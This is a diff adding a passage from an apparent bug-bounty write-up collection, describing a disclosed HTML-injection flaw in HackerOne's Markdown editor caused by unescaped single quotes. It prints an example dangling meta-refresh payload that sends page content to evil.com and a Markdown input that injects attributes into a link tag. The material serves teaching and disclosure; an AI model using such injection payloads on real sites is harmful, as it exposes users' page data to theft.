@@ -34,3 +34,53 @@ it’s possible they tried to URI encode restricted characters and noticed that 
 
 A great URL Encoder is http://quick-encoder.com/url. You’ll notice using it that it will tell you unrestricted characters do not need encoding and give you the
 option to encode url-safe characters anyway. That’s how you would get the same encoded string used on Coinbase.
+
+
+2. HackerOne Unintended HTML Inclusion
+Description:
+After reading about the Yahoo! XSS (example 4 in Chapter 7) I became obsessed with testing HTML rendering in text editors. This included playing with HackerOne’s
+Markdown editor, entering things like ismap= “yyy=xxx” and “‘test” inside of image tags. While doing so, I noticed that the editor would include a single quote within a double
+quote - what is known as a hanging quote.At that time, I didn’t really understand the implications of this. I knew that if you injected another single quote somewhere, the two could
+be parsed together by a browser which would see all content between them as one HTML element. For example:
+<h1>This is a test</h1><p class="some class">some content</p>'
+
+With this example, if you managed to inject a meta tag like:
+<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
+
+the browser would submit everything between the two single quotes. Now, turns out, this was known and disclosed in HackerOne report #1105783 by intidc (https://hackerone.com/intidc).
+When that became public, my heart sank a little.
+
+According to HackerOne, they rely on an implementation of Redcarpet (a Ruby library for Markdown processing) to escape the HTML output of any Markdown input which is then
+passed directly into the HTML DOM (i.e., the web page) via dangerouslySetInnerHTML in their React component. As an aside, React is a Javascript library that can be used to
+dynamically update a web page’s content without reloading the page. The DOM refers to an application program interface for valid HTML and well-formed XML documents. Essentially, according to Wikipedia, the DOM is a cross-platform and language independent convention for representing and interacting with objects in HTML,XHTML and XML documents.
+
+In HackerOne’s implementation, they weren’t properly escaping the HTML output which
+led to the potential exploit. Now, that said, seeing the disclosure, I thought I’d test out
+the new code. I went back and tested out adding:
+
+[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"\
+")
+which got turned into:
+<a title="'test" ismap="alert xss" yyy="test" &#39; ref="http://www.toronotwebsi\
+tedeveloper.com">test</a>
+As you can see, I was able to inject a bunch of HTML into the <a> tag. As a result,
+HackerOne rolled back the fix and began working on escaping single quote again.
+Takeaways
+Just because code is updated, doesn’t mean something is fixed. Test things out.
+When a change is deployed, that also means new code which could contain bugs.
+Additionally, if you feel like something isn’t right, keep digging! I knew the initial
+trailing single quote could be a problem, but I didn’t know how to exploit it and
+I stopped. I should have kept going. I actually learned about the meta refresh
+exploit by reading XSS Jigsaw’s blog.innerht.ml (it’s included in the Resources
+chapter) but much later.
+
+
+
+
+
+
+
+
+
+
+
